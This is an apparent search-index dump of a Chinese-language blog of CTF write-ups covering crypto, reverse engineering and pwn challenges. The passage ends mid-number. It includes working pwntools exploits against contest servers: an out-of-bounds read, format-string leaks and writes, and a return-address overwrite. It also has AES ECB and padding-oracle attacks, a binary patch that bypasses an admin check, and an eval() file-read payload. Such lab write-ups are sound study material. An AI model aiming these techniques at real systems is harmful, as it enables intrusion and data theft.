[{"content":"","date":"2024-12-12","externalUrl":null,"permalink":"/","section":"Homepage","summary":"","title":"Homepage","type":"page"},{"content":"","date":"2024-12-12","externalUrl":null,"permalink":"/notes/","section":"Notes","summary":"","title":"Notes","type":"notes"},{"content":"這題題目大概是輸入一串密碼，然後會驗證是否正確，若是錯誤會輸出Wrong!\n首先先catch syscall write，因為在輸出的時候大部分都會調用到write\n觀察在輸出Wrong!時的函數堆疊\n我們可以假設這些函數會有其中一個會有判斷是否正確的code\n在1279D這邊我們看到有一段看起來像是call了一個判斷字串的函數\n跟進來，這函數有一個像是迴圈的地方，可以猜測她會逐字元判斷，在裡面下一個斷點\n在這個判斷式下斷點，確保繼續到跑迴圈的步驟 強制跳到下一個instruction(程式會繼續跑到斷點) 成功拿到密碼 ","date":"2024-12-12","externalUrl":null,"permalink":"/notes/reverse/patriotctf-2024-rustlock-upsolve/","section":"Notes","summary":"這題題目大概是輸入一串密碼，然後會驗證是否正確，若是錯誤會輸出Wrong!","title":"PatriotCTF 2024 rustLock upsolve","type":"notes"},{"content":"","date":"2024-12-12","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2024-12-12","externalUrl":null,"permalink":"/notes/reverse/","section":"Notes","summary":"","title":"Reverse","type":"notes"},{"content":"\r解題狀況 #\r題目 類別 難度 解題人數 S-box Crypto easy 87 Double Secure Crypto medium 15 Shuffle Hell Crypto hard 6 Peek a char Pwn baby 30 Infinite Recursion Pwn easy 16 String Reverser Pwn medium 7 locked unlocker Reverse baby 26 You know I know the token Reverse medium 20 Crypto #\rS-box #\r照著題目加密(編碼)的方式反過來做就好了\nimport base64 Sbox = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 ] cipher = \u0026#34;b16e45b3d1042f9ae36a0033edfc966e00202f7f6a04e3f5aa7fbec7fc23b17f6a04c75033d12727\u0026#34; cipher = bytes.fromhex(cipher) cipher = bytes(Sbox.index(x) for x in cipher) print(base64.b64decode(cipher)) Double Secure #\r用 e1 和 e2 的最大公因數是 5，所以可以利用共模攻擊把密文縮小成$m^5$，接下來開五次方根就好(我這題的明文設定比較小，可以直接開)\ne1 = 1209025818292500404898024570102134835095 e2 = 1153929820462595439034404807036436005695 c1 = 4686969000176026668142551386405961667244859179091121048789736906319941206633368871603145429789804371517689356724283665615560419220177217061394369109032009837191125570576846003108252054213375517032484936845780176686933021970145944560459910327622173020309196808011289898102369838733513418146248658989833278092245380865500885392466881751439285395948238009780473347394659944225592468491712528382644789159487141824834194698492402509087503284719144175312666038356726647193088410263987334692755831485297259782624493401642724771270618297865273123703684979261387018227373334239613596003448973775510791973553008257272497892749 c2 = 4540297725647331934905237578525216933722595392057237387765407038665230894240204449563209528605647399587374057758620064845160826850834874467466530861889560413716585086967111655199675352965186359605631990782795548688731835329324787086713207234310139569584697775020172181261458867670514322407445943849794394018705433792059849432137048644507043691822321644399785134843330851574379509992140526187868643908531989419115511712486580846719021178555911841665639917213314488825408038260194522914413314352194951861955128509119794766550025992304177755307541355358904591704417309739263026201100425174159070619496076319761127905668 N1 = 11420597945352267246439779981835090037584588491333824626568197775824677557983731463999644894256311021271206322607582216071165117622146217906890462896203921594569439126093578932039659911878686760877479642041356645143332405857507389323442882056801119450744273463542565842985280903907124378453694724227573952940417047614706433822120334077857109663307700994132011851819444180430364772330302858685124576318444033580802013232598348692547021765596536182348708233890220359057622400728625965211209475438433527929412147434590769144689739875814457228384363203070599776289032593445885983011907135099807893621393301265616707684237 N2 = 11420597945352267246439779981835090037584588491333824626568197775824677557983731463999644894256311021271206322607582216071165117622146217906890462896203921594569439126093578932039659911878686760877479642041356645143332405857507389323442882056801119450744273463542565842985280903907124378453694724227573952940417047614706433822120334077857109663307700994132011851819444180430364772330302858685124576318444033580802013232598348692547021765596536182348708233890220359057622400728625965211209475438433527929412147434590769144689739875814457228384363203070599776289032593445885983011907135099807893621393301265616707684237 from gmpy2 import iroot from Crypto.Util.number import * def egcd(a : int, b : int) -\u0026gt; list[int, int]: if a % b: y, x = egcd(b, a % b) y += -x * (a // b) return x, y else: return 0, 1 x, y = egcd(e1, e2) m_5 = pow(c1, x, N1) * pow(c2, y, N1) % N1 m, is_exact = iroot(m_5, 5) print(long_to_bytes(m)) Shuffle Hell #\r加密的示意圖(範圍縮小到 5*2)\n我們知道的是，每一個亂數被使用兩次，而 output 總共為奇數行 這時我們把他們全部 xor 在一起，你會發現每兩個重複的東西對消之後，只會剩下一個 flag\n示意圖\ndef xor(a:bytes, b:bytes)-\u0026gt;bytes: return bytes([x ^ y for (x, y) in zip(a, b)]) output = open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;).read().splitlines() output = [bytes.fromhex(x) for x in output] flag = output[0] for cipher in output[1:]: flag = xor(flag, cipher) print(flag) Reverse #\rlocked unlocker #\r把locked-unlocker.cpython-310.pyc丟pylingual\n然後得到原始碼\n# Decompiled with PyLingual (https://pylingual.io) # Internal filename: locked-unlocker.py # Bytecode version: 3.10.0rc2 (3439) # Source timestamp: 2024-12-11 16:20:53 UTC (1733934053) from Crypto.Cipher import AES from Crypto.Util.Padding import unpad, pad from Crypto.Util.number import * from alive_progress import alive_bar import os import base64 def unlocker(flag): def key_decryptor(ciphertext): c = bytes_to_long(ciphertext) d, n = (4603658780130581148915150220140209357434260720334171947464689689224115300059937591491927995062520871182721152309555936186188185035076128871154176204124793514488557135527608149566977491036337996020603266806593099534710926378143104232680282934708674028324260888928513479725201124908012923904062814280083965953750643748874417922582990140581447104359883546013632213300372709405906550337422870294600571797967308415692350001319846044256769035867042602480100026693980959744730774080841251147954497640746424227114619107029951275270629539250178389315031881132314376397792737912223417817283255802028819736850652480289527248653, 14685324189506833621633107811016252161507381106280877435920825902296463588222347526580992212821242654402628189774220851293950600274703541388602153608650600757314994840159301791101046669751690593584924618968298465038031150257696014704169759196495613034523586560122072909260185257877656023066467007032069256593620750388889071255396806113069316347621756002927816606636249046941467604400177054039626140807225420227261522033732114158666152651006219442012006311015952815775894832796122883380450008664854141360533664966008511126694845625115250782538509459001723387038076625393501801355685209507943320132574334321194302347333) m = pow(c, d, n) plaintext = long_to_bytes(m) return b\u0026#39;\\x00\u0026#39; * (48 - len(plaintext)) + plaintext print(\u0026#39;Starting decryption...\u0026#39;) with alive_bar(256, title=\u0026#39;Decrypting\u0026#39;) as bar: for i in range(256): now_key = key_decryptor(flag[-256:]) flag = flag[:-256] cipher = AES.new(key=now_key[:32], mode=AES.MODE_CBC, iv=now_key[32:]) flag = cipher.decrypt(flag) flag = unpad(flag, 16) bar() print(\u0026#34;Decryption complete! Saving output to \u0026#39;flag.png\u0026#39;.\u0026#34;) with open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(flag) serial_number = input(\u0026#39;Enter the serial number to unlock this product: \u0026#39;) if serial_number == \u0026#39;WA4Au-l10ub-18T7W-u9Yx2-Ms4Rl\u0026#39;: print(\u0026#39;Unlocking...\u0026#39;) unlocker(open(\u0026#39;flag.png.locked\u0026#39;, \u0026#39;rb\u0026#39;).read()) else: print(\u0026#39;Invalid serial number. Access denied.\u0026#39;) 最後你只要直接執行unlocker(open(\u0026lsquo;flag.png.locked\u0026rsquo;, \u0026lsquo;rb\u0026rsquo;).read())就可以得到flag.png了\nYou know I know the token #\r解法 1 #\r首先你透過 ida 打開他，大概分析一下原始碼會發現，你不能生成Administrator的 token\n直接把這邊的 jnz 改成 jz\n這樣就可以在輸入 Administrator 的時候不會被擋住\n解法二 #\r你可以先假設這些複雜的加密、雜湊算法不是開發者自己寫的\n而在對稱加密、雜湊算法中會用到一些常數，而這些常數通常是固定的\n然後把這些常數拿去 google，你就會發現它是sha256\n直接拿去生 token\nPwn #\rPeek a char #\r這題的關鍵在於沒有限制陣列 index 的範圍\n先亂戳戳，然後戳出 flag\n可以用 pwntool 加速這個過程\nfrom pwn import * from tqdm import trange r = remote(\u0026#34;23.146.248.230\u0026#34;, 12343) r.sendlineafter(b\u0026#34;Enter your input: \u0026#34;, b\u0026#34;hokak\u0026#34;) flag = b\u0026#34;\u0026#34; for i in trange(-100, 0): r.sendlineafter(b\u0026#34;Enter the index of the character you want to inspect: \u0026#34;, str(i).encode()) r.recvuntil(f\u0026#34;The character at index {i} is \u0026#39;\u0026#34;.encode()) flag += (r.recv(1)) print(flag) Infinite Recursion #\r我們知道fsb這個函數有 format string bug\n然後bof有 buffer overflow\n所以這題可以透過fsbleak 出 return address\n再計算出main+116，也就是在沒有無限遞迴情況下，rand_fun的 return address\n在執行 printf 之前，rsp+0x18會存放著 fsb 的 return address:rand_fun+35\n使用 payload:%9$p可以 leak 出來\n接下來計算 offset\n得出main+116 = rand_fun+35 - 0x2d9 + 0x366\nfrom pwn import * r = remote(\u0026#34;23.146.248.230\u0026#34;, 12355) r.recvuntil(b\u0026#34;Try to escape haha \u0026gt;:)\\n\u0026#34;) while b\u0026#34;fsb\u0026#34; not in r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;): r.sendline(b\u0026#34;a\u0026#34;) r.sendline(b\u0026#34;%9$p\u0026#34;) rand_fun_addr = int(r.recv(14).decode(), 16) payload = b\u0026#34;a\u0026#34; * 8 * 3 + p64(rand_fun_addr - 0x2d9 + 0x366) while b\u0026#34;bof\u0026#34; not in r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;): r.sendline(b\u0026#34;a\u0026#34;) r.sendline(payload) r.interactive() String Reverser #\r在 format string 中，\u0026quot;%xc%y$hn\u0026quot;可以把第y個參數所指向的值的最低兩個 byte 改成x\n知道這點後，我們在可以尋找一條長得像 A -\u0026gt; B -\u0026gt; C 的資料，在這邊我main function 傳遞的argv chain\n和這條所指的B -\u0026gt; C\n假設target是我們欲改值的位址\n寫入0xbeef #\r利用A -\u0026gt; B -\u0026gt; C這條把C改成target\n再利用B -\u0026gt; C這條把target的最低兩個 byte 改成0xbeef\n寫入0xdead #\r重複剛剛的動作，但把C改成target + 2\n再寫入0xdead\nfrom pwn import * r = remote(\u0026#34;23.146.248.230\u0026#34;, 12321) payload = \u0026#34;%{}$p\u0026#34;.format(0x6 + 0x7) r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) rsp = r.recv(16).decode().strip() rsp = int(rsp, 16) - 0x25 * 0x8 print(f\u0026#34;rsp address: {hex(rsp)}\u0026#34;) target_addr = (rsp + 0xc) # rsp + 0x38 -\u0026gt; rsp + 0x128 \u0026lt;- data payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(target_addr \u0026amp; 0xFFFF, 0x6 + 0x7).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(0xbeef, 0x6 + 0x25).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format((target_addr + 2) \u0026amp; 0xFFFF, 0x6 + 0x7).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) payload = \u0026#39;%{}c%{}$hn\u0026#39;.format(0xdead, 0x6 + 0x25).encode() r.sendlineafter(b\u0026#34;String: \u0026#34;, payload[::-1]) r.interactive() 看不懂可以參考這篇\n心得 #\r這次 THJCC 在比賽之前一周，我看著有些類別還空空的就用我的題目把它填滿了\n所以你會看到很多Author: Dr.dog\n因為也時間比較急迫的關係導致難度控的比較差，也寫不出比較複雜的題目\n下次可以期待一下會有更大包的Reverse題，更花式的Pwn還有更複雜的Crypto\n預告:\nnext time will be harder\n","date":"2024-12-12","externalUrl":null,"permalink":"/posts/thjcc-2024-winter/","section":"Posts","summary":"解題狀況 #\r題目 類別 難度 解題人數 S-box Crypto easy 87 Double Secure Crypto medium 15 Shuffle Hell Crypto hard 6 Peek a char Pwn baby 30 Infinite Recursion Pwn easy 16 String Reverser Pwn medium 7 locked unlocker Reverse baby 26 You know I know the token Reverse medium 20 Crypto #\rS-box #\r照著題目加密(編碼)的方式反過來做就好了","title":"THJCC 2024 winter 出題心得","type":"posts"},{"content":"\rIntro #\rReverse #\rlazy7 #\r題目有一個壓縮資料的function\n和一個把資料轉成16進位的function\n題目大概會這樣使用這些function\n題目檔案大概會做這件事\n壓縮-\u0026gt;hex encode-\u0026gt;壓縮-\u0026gt;hex encode\n但仔細觀察你會發現他有把解壓縮和hex decode的function寫在檔案裡面\n所以只要做這件事就好了\nhex decode-\u0026gt;解壓縮-\u0026gt;hex decode-\u0026gt;解壓縮\n#include \u0026#34;defs.h\u0026#34; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; _BYTE sub_140C(long long a1, int a2, long long a3) { long long v3; // rdx int v4; // eax _BYTE *result; // rax int v7; // [rsp+20h] [rbp-18h] int i; // [rsp+24h] [rbp-14h] int j; // [rsp+28h] [rbp-10h] long long v10; // [rsp+2Ch] [rbp-Ch] int v11; // [rsp+34h] [rbp-4h] v7 = 0; for ( i = 0; i \u0026lt; a2; ++i ) { v3 = 12LL * i; v10 = *(_QWORD *)(v3 + a1); v11 = *(_DWORD *)(v3 + a1 + 8); for ( j = 0; j \u0026lt; SHIDWORD(v10); ++j ) { *(_BYTE *)(v7 + a3) = *(_BYTE *)(v7 - (int)v10 + a3); ++v7; } v4 = v7++; *(_BYTE *)(a3 + v4) = v11; } result = (_BYTE *)(v7 + a3); *result = 0; return result; } long long sub_1642(const char *a1, void **a2) { int v3; // [rsp+14h] [rbp-1Ch] BYREF int v4; // [rsp+18h] [rbp-18h] BYREF int v5; // [rsp+1Ch] [rbp-14h] BYREF int i; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] unsigned long long v8; // [rsp+28h] [rbp-8h] v7 = strlen(a1) / 0xA; *a2 = malloc(12LL * (int)v7); for ( i = 0; i \u0026lt; (int)v7; ++i ) { sscanf(\u0026amp;a1[10 * i], \u0026#34;%4X%4X%2X\u0026#34;, \u0026amp;v3, \u0026amp;v4, \u0026amp;v5); *((_DWORD *)*a2 + 3 * i) = v3; *((_DWORD *)*a2 + 3 * i + 1) = v4; *((_BYTE *)*a2 + 12 * i + 8) = v5; } return v7; } int main() { void *comp2; void *comp1; char *de1; char *de2; long long len; len = sub_1642(output, \u0026amp;comp2); de1 = (char *)malloc(0x100000); sub_140C((long long)comp2, len, (long long)de1); const char *output = \u0026#34;000000003000010007360000000039000A000835000B00013000150007340000000032000A000946001E00093200320008370001000130003D00073300450008300032000142003C000937005A0009370064000946005A0009310078000331003B0004340000000045007800093300820009350096000938008C000935006900073\u0026#34;...(略) len = sub_1642(de1, \u0026amp;comp1); de2 = (char *)malloc(0x100000); sub_140C((long long)comp1, len, (long long)de2); printf(\u0026#34;result: %s\\n\u0026#34;, de2); FILE *fp = fopen(\u0026#34;flag\u0026#34;, \u0026#34;wb\u0026#34;); // 開啟文件以寫入二進制模式 fwrite(de2, 1, strlen(de2), fp); // 寫入數據 fclose(fp); free(comp2); free(de1); free(de2); return 0; } 把拿到的東西拿去base64decode就可以得到flag.png了:D\nUnityFlagChecker #\r可以先把GameAssembly.dll用il2cppdumper彈出原本的資訊\n這邊有一個checkstring，是加密後的flag，然後被base64 encode後\n這邊有一堆function，雖然不能看到裡面的內容，但可以看到他的VA\n用ida開啟原本的GameAssembly.dll，然後分析裡面的東西，可以發現他是使用chacha20\n最後用x64 dbg在這個function設breakpoint，這會使他再加密前停止 停在這裡 這邊r8是存要加密的資料的指標，選擇跟進後可以看到他的memory 接著把這段改成加密後的flag(base64decoded) r9改成flag的長度(0x36) 然後continue，flag就會出來了 ","date":"2024-11-11","externalUrl":null,"permalink":"/writeups/cggc-2024/","section":"Writeups","summary":"Intro #\rReverse #\rlazy7 #\r題目有一個壓縮資料的function","title":"CGGC 2024 初賽","type":"writeups"},{"content":"","date":"2024-11-11","externalUrl":null,"permalink":"/writeups/","section":"Writeups","summary":"","title":"Writeups","type":"writeups"},{"content":"\rIntro #\rranking #\r團隊總排名33/1360|2%\nsolves(personal) #\rCategory solves Crypto 4/10 Reverse 2/10 我跟隊友說好我要打Crypto然後我就真的只去戳Crypto\n結果居然沒讓我算到數學，幾乎打得都是對稱加密QwQ\n最後看Reverse好像解題數有點少就去幫忙消化幾題\n在解的過程中，隊伍一度衝到前30\n其實我原本應該是會去打pwn的，但時間已經很晚了\n雖然看到pwn的解題數還是很低，不過為了我的肝我就不碰了\n這次的題目我覺得出得很棒，學到了很多酷東西\nCrypto #\rHard to implement #\r解法 #\r重複多次\nencryption AES(ECB_MODE, 128bits) data user_input + flag 解法 #\rAES prepend oracle:\n假設使用者輸入000000000000000\n密文的第一個block會是000000000000000 + flag的第一個字\n輸入00000000000000\n密文的第一個block則會是00000000000000 + flag的前兩個字\n於是我們可以透過窮舉最後一個字元，並驗證密文是否相等\n000000000000000a\n000000000000000b\n000000000000000c\n\u0026hellip;\n000000000000000p\n以此類推其他求出接下來的字元\n00000000000000pa\n00000000000000pb\n\u0026hellip;\nsolve:\nfrom pwn import * from tqdm import * r = remote(\u0026#39;chal.competitivecyber.club\u0026#39;, 6002) pretends = [] for i in range(15, 1, -1): r.sendlineafter(b\u0026#39;Send challenge \u0026gt; \u0026#39; ,b\u0026#39;0\u0026#39; * i) r.recvuntil(b\u0026#39;Response \u0026gt; \u0026#39;) pretend = bytes.fromhex(r.recv(32).decode()) pretends.append(pretend) oracle = b\u0026#39;\u0026#39; for i, pretend in enumerate(pretends): for byte in trange(0x20, 0x7f): payload = b\u0026#39;0\u0026#39; * (15 - i) + oracle + bytes([byte]) r.sendlineafter(b\u0026#39;Send challenge \u0026gt; \u0026#39; , payload) r.recvuntil(b\u0026#39;Response \u0026gt; \u0026#39;) response = bytes.fromhex(r.recv(32).decode()) if response == pretend: oracle += bytes([byte]) print(oracle.decode()) break High Roller #\r解法 #\r用時間當seed，生成公私鑰，並寫出到一個.pem檔 解法 #\r可以透過檔案的最後修改時間獲得seed\nsolve:\nimport os from Crypto.Util.number import * from Crypto.PublicKey import RSA import random filetime = os.path.getmtime(\u0026#34;public_key.pem\u0026#34;) with open(\u0026#34;public_key.pem\u0026#34;, \u0026#34;rb\u0026#34;) as key_file: public_key = RSA.import_key(key_file.read()) origin_N = public_key.n e = public_key.e d = 0 random.seed(int(filetime)) p, q = getPrime(512, random.randbytes), getPrime(512, random.randbytes) n = p*q phi = (p-1)*(q-1) assert n == origin_N d = pow(e, -1 , phi) assert d * e % phi == 1 C = bytes_to_long(open(\u0026#39;flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read()) flag = long_to_bytes(pow(C, d, n)) print(flag) bit by bit #\r解法 #\r把明文的每16個字元分成一個chunk\n有一把key, 一個個iv\n每次對一個chunk，用key + iv進行xor加密\n每次結束後，iv = (iv + 1) % 256\n解法 #\r用xortool可以先得到key的前15bytes\nsolve:\nfrom pwn import * from Crypto.Util.number import * import sys blocksize = 16 def transmit(): key = bytes_to_long(b\u0026#39;\\x00\\x00\\x00\\x00\\xae\\xcdK\\x13\\x90E#\\xeai\\xba\\xfe\\x00\u0026#39;) iv = 0 msg = open(\u0026#39;cipher.txt\u0026#39;, \u0026#39;rb\u0026#39;).read() chunks = [msg[i:i+16] for i in range(0,len(msg), 16)] send = b\u0026#39;\u0026#39; for chunk in chunks: iv = (iv+1) % 255 curr_k = b\u0026#39;\\x00\u0026#39; * 4 + long_to_bytes(key+iv) plain = xor(curr_k, chunk) send += plain print(send.decode()) sys.exit(0) if __name__==\u0026#34;__main__\u0026#34;: transmit() protected console #\rbtw這題因為這邊連線速度太慢，主辦方幫忙代跑腳本\n解法 #\r多次加密\nencryption AES(CBC_MODE, 128bits) data user_hex_input[16:] iv user_hex_input[:16] 題目會解析密文(json)，並讀出username和role的值\n一旦username = \u0026quot;administrative_user\u0026quot;, role = 1\n就可以進入admin console，可執行print()指令\n解法 #\r弱點\n解密後會判斷padding是否正常\n這讓我們可以用padding oracle來獲得block解密後的訊息\n再加上可控制iv，所以我們可以有辦法改變整個密文\npadding檢查:\n但這個padding判斷的方式有點奇怪\n如果只需一個bytes的padding，可以是\\x00或\\x01\n所以padding oracle要先找出最後一個byte是\\x00和\\x01 並判斷哪個是\\x01 (\\x00倒數第二個byte必定找不到因為\\x02\\x03不符合padding規則)\n我們知道\n$$ \\begin{align*} P_1 \u0026amp;= D(C_1) \\oplus IV \\cr P_2 \u0026amp;= D(C_2) \\oplus C_1 \\cr P_3 \u0026amp;= D(C_3) \\oplus C_2 \\cr \\end{align*} $$ 所以我們可以透過padding oracle構造這些資料\n$$ \\begin{align*} C_3 \u0026amp;= \\text{aaaaaaaaaaaaaaaa} \\cr\nC_2 \u0026amp;= D(C_3) \\oplus P_3 \\cr\nC_1 \u0026amp;= D(C_2) \\oplus P_2 \\cr\nIV \u0026amp;= D(C_1) \\oplus P_1 \\cr\n\\end{align*} $$\n送出$IV+C_1+C_2+C_3$就可以進入admin console了 最後利用bit flipping 執行print(flag)\nReverse #\rPacked Full Of Surprises #\r我好像是非預期解\n題目 #\r可以讀入flag.txt\n加密後寫出flag.txt.enc\n解法 #\r於是我把原本的flag.txt.enc存成encrypted_flag.enc 把file read/write 當做 input/out solve:\nimport subprocess from tqdm import * elf_path = \u0026#34;./encrypt\u0026#34; flag = b\u0026#39;\u0026#39; correctflag = open(\u0026#39;encrypted_flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() for i, ch in enumerate(correctflag): for byte in trange(0x20, 0x7f): open(\u0026#39;flag.txt\u0026#39;, \u0026#39;wb\u0026#39;).write(flag + bytes([byte])) subprocess.run([elf_path]) result = open(\u0026#39;flag.txt.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() if result[i] == ch: flag += bytes([byte]) break print(flag) AI rnd #\r題目 #\r感覺是串流加密\n解法 #\r用上題的方式可以大致解出，但相同字元可能會出現分歧，但我們可以猜測flag的字元 import subprocess from tqdm import * elf_path = \u0026#34;./ai_rnd\u0026#34; flag = \u0026#39;\u0026#39; cur = \u0026#39;a5 39 24 90 a8 a5 88 77 26 e4 3c 14 03 1e ba 3c 7d bb dc d6 aa 90 50 c9 0f aa dd 57 33 e1 a4 c7\u0026#39;.split() for i in range(64): a = [] for byte in range(0x20, 0x7f): process = subprocess.Popen( [elf_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True ) stdout, stderr = process.communicate(input=flag + chr(byte)) if stdout.split()[i] == cur[i]: print(flag) a.append(chr(byte)) if len(a) \u0026gt; 1: print(a) i = input(\u0026#39;what: \u0026#39;) flag += i else: flag += a[0] ","date":"2024-09-09","externalUrl":null,"permalink":"/writeups/patriotctf-2024/","section":"Writeups","summary":"Intro #\rranking #\r團隊總排名33/1360|2%","title":"PatriotCTF 2024","type":"writeups"},{"content":"\rintro #\rranking #\r總排名193/1184|TOP 16%\nsolves #\rCategory solves Intro 2/3(feedback沒寫) OSINT 2/4 Forensics 2/5 Web 1/5 Crypto 3/5 Pwn 3/4 Reverse 2/4 這次比賽只有我一個人，再次體會到團隊合作的重要性\n題目沒有很難，也有可能是我解德剛好都不難 BTW這次比賽有睡爽爽，肝一下有可能爬到前百\nINTRO #\rflag #\r但有人不解，什麼諧咖\nOSIRIS Trivia #\r用 wayback machine 找之前的存檔\nOSINT #\rRickshaw #\r車牌77 CD-xxx，CD代表有外交任務，77代表美國\nU.S. Embassy \u0026amp; Consulates in India找電話號碼\nAuthentic Chinese Food #\r從電話號碼718-875得知位置為Brooklyn, New York\n找到當地的Panda Express 從NYC Department of Health and Mental Hygiene找衛生評級 從NYC Property Information Portal找Year Built、llc Forensics #\rZipZipZip #\r題目給的chalenge.zip，包了很多層zip+txt 檔案結構大概長這樣\nchallenge ├── chunk_0 │ ├── chunk_0.txt │ ├── chunk_1 │ │ ├── chunk_1.txt │ │ ├── chunk_2 │ │ │ ├── chunk_2.txt │ │ │ └── chunk_3.zip │ │ └── chunk_2.zip │ └── chunk_1.zip └── chunk_0.zip 但每個chuck_##.txt都只有五個字元，可以利用這點讀出所有字元\n一個檔案在這個zip格式大概為檔名|內容|504B\n取前十個字元base64 decode可以得知這是一張圖片的base64\nsolve:\nimport base64 s = open(\u0026#39;challenge.zip\u0026#39;, \u0026#39;rb\u0026#39;).read().split(b\u0026#39;.txt\u0026#39;)[1:] flag = b\u0026#34;\u0026#34;.join([x[:5] for x in s]) open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;).write(base64.b64decode(flag)) flag.png:\nThe Triple Illusion #\rplaintext: key: solve:\nplaintext = \u0026#34;csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}\u0026#34; key = [0,0,0,0,0,0,0,0,15,23,23,4,7,0,22,1,23,28,0,18,10,12,0,7,23,2,17,18,21,16,0,0,0,0,0,28,7,16,17,16,6,17,11,0,1,0,21,23,4,24,0,0,0,0,0,0] for (ch, ch2) in zip(plaintext, key): print(chr((ord(ch)^ch2)),end=\u0026#34;\u0026#34;) 解是用xor，可以從plaintext的字元分布和key得知這兩者的關係\n另外這題其實有三張圖片，有一張藏了vigenere cipher\n但沒有用到解出來的資訊\nWeb #\rPlaying on the Backcourts #\r題目的app.py有eval()，利用他開啟leaderboard.txt(題目要求 )\npayload:open(leaderboard_path, 'r').read()\n==注:賽後題目連結掛了，沒實際截圖==\nCrypto #\rTrapdoor #\rfrom Crypto.Util.number import long_to_bytes, GCD c1 = 303135796212555524279246573902478466434668217093546174680188235179057490491567473700120780102242009132103258508861486434415180823527955099967761217116349255542170598035252007386938049207815599595446898483965896318999163451327331078078222461159124295427725319096144123597554777586957979868444674275889889844032174888734978810757381148576980597387087054100968752977308860522457902588682074271109316333433256639990524116155937375917691984587952422148443784463343758327600719630349711698888298784945165573146249574661292447746934401167219320522948251442094538198108317569766073873733715196594572438686070303424017394902382093899765518500483375456912409097537955914052714322746314137960293312838915565869071605155935644478996344290292865819278674982079257062718982942611077051220570396851353684880714275636550356149610683653718033949374671376446552695669216994087720088804557425225900737145094882031616103378878538121913250609632802433851115524402329496182016641849196645450203369856549243934741848598773875346669657888813923243297096273166067843490617097664952249302907248385981657386549425150606813818575526156807496438444686156127519692376856599876276294335897476875870006918535394383682369081298573978241442661476323352300777091182989 c2 = 4958574750605203885241719725605623296139748534009838220208458889257304916000624305181725168992607042645602737819342235943028597225305348323406600625298482649900867820513039877905039754231802622993313386154075345332146821131335993292930311290851004495779929345184343446566574942859319385648138506286479277360245831317445320090490446939175713265378573841020567833072207569467414122717685599757472520670279855394449431135290289706503181269523043742136996629222378918028239764683802689430501074750559094593554236862082382465970534657556033500704816285346816155310802120874461703322831552653598827063156596701163162660815016826940778186658506731031099866741130427107533784544815530525778506175213466217786119477598590499495112387124792052247535011527688406596603481257322195096020681056098187442173457934006525467825889246167107176047893118343109465035650141251129363868218308142552818956868008869000051346078524507273431552823710241912911862279313598480932977970559